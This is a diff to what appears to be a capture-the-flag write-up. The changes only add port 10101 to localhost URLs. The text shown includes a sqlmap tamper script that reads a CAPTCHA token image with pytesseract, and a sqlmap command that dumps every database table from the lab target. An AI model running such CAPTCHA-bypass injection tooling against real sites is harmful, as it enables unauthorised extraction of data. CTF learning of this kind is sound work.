@@ -36,7 +36,7 @@ import requests
 from PIL import Image
 import io
 
-url = 'http://127.0.0.1/token'
+url = 'http://127.0.0.1:10101/token'
 data = requests.get(url).content
 img = Image.open(io.BytesIO(data))
 text = pytesseract.image_to_string(img)
@@ -66,7 +66,7 @@ def dependencies():
     pass
 
 def tamper(payload, **kwargs):
-    url = 'http://127.0.0.1/token'
+    url = 'http://127.0.0.1:10101/token'
     data = requests.get(url).content
     img = Image.open(io.BytesIO(data))
     text = pytesseract.image_to_string(img)
@@ -80,7 +80,7 @@ You also may need to throw an empty \__init__.py file into the same folder, as i
 
 Let's try to use this new tamper script and see if we can get any results:
 ```
-sqlmap --tamper=trollsec_tamper.py -u http://127.0.0.1/_search?query=troll* --dump-all --level=3 --skip-urlencode
+sqlmap --tamper=trollsec_tamper.py -u http://127.0.0.1:10101/_search?query=troll* --dump-all --level=3 --skip-urlencode
 ```
 
 Eventually, we get results! Unfortunately, it's too many results! There's 30 different secrets tables, and each one is basically just a number of IDs and single letters. Looking at all those letters, they all look like they're base64 characters. Maybe if we just grab all the letters, put them together, and base64 decode it we get something?
